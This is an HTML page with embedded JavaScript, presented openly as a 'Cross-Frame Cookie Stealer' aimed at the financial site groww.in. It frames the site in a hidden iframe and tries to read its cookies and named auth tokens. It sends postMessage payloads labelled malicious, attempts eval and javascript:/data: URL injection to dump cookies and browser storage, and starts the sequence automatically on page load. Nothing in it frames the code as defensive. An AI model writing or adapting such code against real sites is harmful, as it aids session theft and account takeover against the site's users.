<!DOCTYPE html>
<html>
<head>
    <title>üîì Cookie Stealer via iFrame</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #000; color: #00ff00; }
        .result { border: 2px solid #ff0000; padding: 15px; margin: 10px 0; background: #111; }
        .success { border-color: #00ff00; background: #003300; }
        iframe { width: 100%; height: 300px; border: 1px solid #666; }
        button { background: #ff0000; color: white; padding: 15px; border: none; margin: 5px; cursor: pointer; }
        pre { background: #222; color: #fff; padding: 10px; overflow-x: auto; font-size: 12px; }
        .log { background: #000; color: #00ff00; padding: 10px; font-family: monospace; max-height: 200px; overflow-y: auto; }
    </style>
</head>
<body>
    <h1>üîì Cross-Frame Cookie Stealer</h1>
    <p>Attempting to extract cookies via iframe communication...</p>
    
    <button onclick="loadGrowwFrame()">üì° Load Groww Frame</button>
    <button onclick="attemptCookieExtraction()">üç™ Extract Cookies</button>
    <button onclick="triggerPostMessage()">üì§ Trigger PostMessage</button>
    <button onclick="injectJavaScript()">üíâ Inject JavaScript</button>
    
    <div id="log" class="log">
        <div>üöÄ Cross-Frame Cookie Stealer Ready...</div>
    </div>
    
    <iframe id="growwFrame" style="display:none;"></iframe>
    
    <div id="results"></div>

    <script>
        let logContainer = document.getElementById('log');
        let resultsContainer = document.getElementById('results');
        let growwFrame = document.getElementById('growwFrame');
        let extractedData = {};
        
        function log(message) {
            const timestamp = new Date().toLocaleTimeString();
            logContainer.innerHTML += `<div>[${timestamp}] ${message}</div>`;
            logContainer.scrollTop = logContainer.scrollHeight;
            console.log(message);
        }
        
        function addResult(title, content, className = 'result') {
            const div = document.createElement('div');
            div.className = className;
            div.innerHTML = `<h3>${title}</h3><div>${content}</div>`;
            resultsContainer.appendChild(div);
        }

        // 1. Load Groww domain in iframe
        function loadGrowwFrame() {
            log("üì° Loading Groww domain in iframe...");
            
            // Try different Groww URLs that might allow framing
            const growwUrls = [
                'https://groww.in/help/credit',
                'https://credit.groww.in/help/credit',
                'https://groww.in/help',
                'https://credit.groww.in',
                'https://groww.in'
            ];
            
            let currentIndex = 0;
            
            function tryNextUrl() {
                if (currentIndex >= growwUrls.length) {
                    log("‚ùå All Groww URLs failed to load in iframe");
                    return;
                }
                
                const url = growwUrls[currentIndex];
                log(`üîÑ Trying to load: ${url}`);
                
                growwFrame.onload = function() {
                    log(`‚úÖ Successfully loaded: ${url}`);
                    addResult("iFrame Loaded", `Successfully loaded Groww domain: ${url}`, 'success');
                    
                    // Try to access the iframe content
                    setTimeout(() => attemptFrameAccess(), 1000);
                };
                
                growwFrame.onerror = function() {
                    log(`‚ùå Failed to load: ${url}`);
                    currentIndex++;
                    setTimeout(tryNextUrl, 1000);
                };
                
                growwFrame.src = url;
                currentIndex++;
            }
            
            tryNextUrl();
        }

        // 2. Try to access iframe content
        function attemptFrameAccess() {
            log("üîç Attempting to access iframe content...");
            
            try {
                // Try to access iframe document
                const frameDoc = growwFrame.contentDocument || growwFrame.contentWindow.document;
                
                if (frameDoc) {
                    log("‚úÖ Can access iframe document!");
                    
                    // Try to get cookies from iframe
                    const frameCookies = frameDoc.cookie;
                    log(`üç™ Frame cookies: ${frameCookies || 'None'}`);
                    
                    if (frameCookies) {
                        extractedData.frameCookies = frameCookies;
                        
                        // Look for auth tokens
                        const authTokens = ['lhtndhgfd', 'arkeyt473rfh7834cd', 'AUTH_SESSION_ID'];
                        let foundTokens = [];
                        
                        authTokens.forEach(token => {
                            if (frameCookies.includes(token)) {
                                foundTokens.push(token);
                            }
                        });
                        
                        if (foundTokens.length > 0) {
                            addResult("üö® AUTH TOKENS FOUND IN IFRAME", 
                                `Found: ${foundTokens.join(', ')}<br><pre>${frameCookies}</pre>`, 'success');
                        } else {
                            addResult("Frame Cookies", `<pre>${frameCookies}</pre>`);
                        }
                    }
                    
                } else {
                    log("‚ùå Cannot access iframe document (CORS/X-Frame-Options blocked)");
                }
                
            } catch (e) {
                log(`‚ùå Frame access blocked: ${e.message}`);
                
                // Try alternative access methods
                attemptPostMessageCommunication();
            }
        }

        // 3. Try postMessage communication
        function attemptPostMessageCommunication() {
            log("üì§ Attempting postMessage communication...");
            
            // Listen for messages from iframe
            window.addEventListener('message', function(event) {
                log(`üì® Received message from: ${event.origin}`);
                log(`üì® Message data: ${JSON.stringify(event.data)}`);
                
                if (event.origin.includes('groww.in')) {
                    extractedData.postMessages = extractedData.postMessages || [];
                    extractedData.postMessages.push({
                        origin: event.origin,
                        data: event.data
                    });
                    
                    addResult("PostMessage from Groww", 
                        `Origin: ${event.origin}<br><pre>${JSON.stringify(event.data, null, 2)}</pre>`);
                }
            });
            
            // Try to send messages to iframe
            if (growwFrame.contentWindow) {
                const messages = [
                    { action: 'getCookies' },
                    { action: 'getAuthTokens' },
                    { action: 'extractData' },
                    'getCookies',
                    'getAuthData'
                ];
                
                messages.forEach(msg => {
                    try {
                        growwFrame.contentWindow.postMessage(msg, '*');
                        log(`üì§ Sent message: ${JSON.stringify(msg)}`);
                    } catch (e) {
                        log(`‚ùå Failed to send message: ${e.message}`);
                    }
                });
            }
        }

        // 4. Force cookie extraction
        function attemptCookieExtraction() {
            log("üç™ Forcing cookie extraction...");
            
            // Method 1: Try direct access
            try {
                if (growwFrame.contentWindow) {
                    const cookies = growwFrame.contentWindow.document.cookie;
                    if (cookies) {
                        log(`üéØ Direct cookie access: ${cookies}`);
                        extractedData.directCookies = cookies;
                    }
                }
            } catch (e) {
                log(`‚ùå Direct cookie access failed: ${e.message}`);
            }
            
            // Method 2: Try JavaScript injection
            try {
                if (growwFrame.contentWindow) {
                    growwFrame.contentWindow.eval(`
                        console.log('Injected script running');
                        if (window.parent) {
                            window.parent.postMessage({
                                type: 'cookieData',
                                cookies: document.cookie,
                                localStorage: JSON.stringify(localStorage),
                                sessionStorage: JSON.stringify(sessionStorage)
                            }, '*');
                        }
                    `);
                    log("‚úÖ JavaScript injection attempted");
                }
            } catch (e) {
                log(`‚ùå JavaScript injection failed: ${e.message}`);
            }
        }

        // 5. Trigger postMessage manually
        function triggerPostMessage() {
            log("üì§ Manually triggering postMessage...");
            
            if (growwFrame.contentWindow) {
                const payloads = [
                    { action: 'EXTRACT_COOKIES', source: 'malicious' },
                    { type: 'GET_AUTH_DATA' },
                    { command: 'DUMP_STORAGE' },
                    'extract_all_data'
                ];
                
                payloads.forEach(payload => {
                    try {
                        growwFrame.contentWindow.postMessage(payload, '*');
                        log(`üì§ Posted: ${JSON.stringify(payload)}`);
                    } catch (e) {
                        log(`‚ùå PostMessage failed: ${e.message}`);
                    }
                });
            }
        }

        // 6. JavaScript injection attempt
        function injectJavaScript() {
            log("üíâ Attempting JavaScript injection...");
            
            // Try to inject via URL manipulation
            const injectionUrls = [
                'https://groww.in/help/credit#<script>parent.postMessage(document.cookie,"*")</script>',
                'javascript:parent.postMessage(document.cookie,"*");',
                'data:text/html,<script>parent.postMessage(document.cookie,"*")</script>'
            ];
            
            injectionUrls.forEach(url => {
                try {
                    const testFrame = document.createElement('iframe');
                    testFrame.style.display = 'none';
                    testFrame.src = url;
                    document.body.appendChild(testFrame);
                    log(`üíâ Injected frame with: ${url.substring(0, 50)}...`);
                    
                    setTimeout(() => {
                        document.body.removeChild(testFrame);
                    }, 2000);
                } catch (e) {
                    log(`‚ùå Injection failed: ${e.message}`);
                }
            });
        }

        // 7. Display extracted data
        function showExtractedData() {
            if (Object.keys(extractedData).length > 0) {
                addResult("üéØ EXTRACTED DATA SUMMARY", 
                    `<pre>${JSON.stringify(extractedData, null, 2)}</pre>`, 'success');
                log(`‚úÖ Total extracted data points: ${Object.keys(extractedData).length}`);
            } else {
                log("‚ùå No data extracted");
            }
        }

        // Auto-start
        window.addEventListener('load', function() {
            log("üîì Cross-Frame Cookie Stealer loaded");
            log(`üéØ Current URL: ${location.href}`);
            
            // Start extraction sequence
            setTimeout(() => {
                log("üöÄ Starting automated extraction...");
                loadGrowwFrame();
                
                // Show results after attempts
                setTimeout(() => showExtractedData(), 10000);
            }, 2000);
        });

        // Monitor for any success
        setInterval(() => {
            if (Object.keys(extractedData).length > 0) {
                showExtractedData();
            }
        }, 5000);
    </script>
</body>
</html>
